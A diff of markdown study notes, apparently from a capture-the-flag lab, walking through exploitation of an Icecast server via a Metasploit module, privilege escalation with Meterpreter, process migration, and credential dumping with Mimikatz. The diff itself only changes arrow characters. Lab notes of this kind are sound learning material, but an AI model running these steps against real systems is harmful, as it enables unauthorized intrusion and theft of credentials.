@@ -16,13 +16,13 @@
 
 - gaining access throught Icecast and escalating privileges
 	- research on vulnerabilities
-		- https://www.cvedetails.com/cve/CVE-2004-1561/ -> has Metasploit exploit
+		- https://www.cvedetails.com/cve/CVE-2004-1561/ → has Metasploit exploit
 	- Metasploit
-		- -> run `exploit/windows/http/icecast_header`
+		- → run `exploit/windows/http/icecast_header`
 	- Meterpreter
 		- sessionId: session 1
-		- who is running Icecast? (current user) => `getuid` -> Dark
-		- `sysinfo` -> get info about build,...
+		- who is running Icecast? (current user) → `getuid` → Dark
+		- `sysinfo` → get info about build,...
 		- `run post/multi/recon/local\_exploit\_suggester`
 			- can run several minutes
 			- will give us potential exploits
@@ -43,9 +43,9 @@
 - start looting
 	- show running processes `ps`
 	- find one that is running on the same architecture as lsass service
-		- -> spoolsv.exe ~ printer
+		- → spoolsv.exe ~ printer
 	- switch to another process `migrate -N <process_name>`
-		- -> now we have full admin permission
+		- → now we have full admin permission
 	- run Mimikatz `load kiwi`
 		- retrieve all creds `creds_all`
 
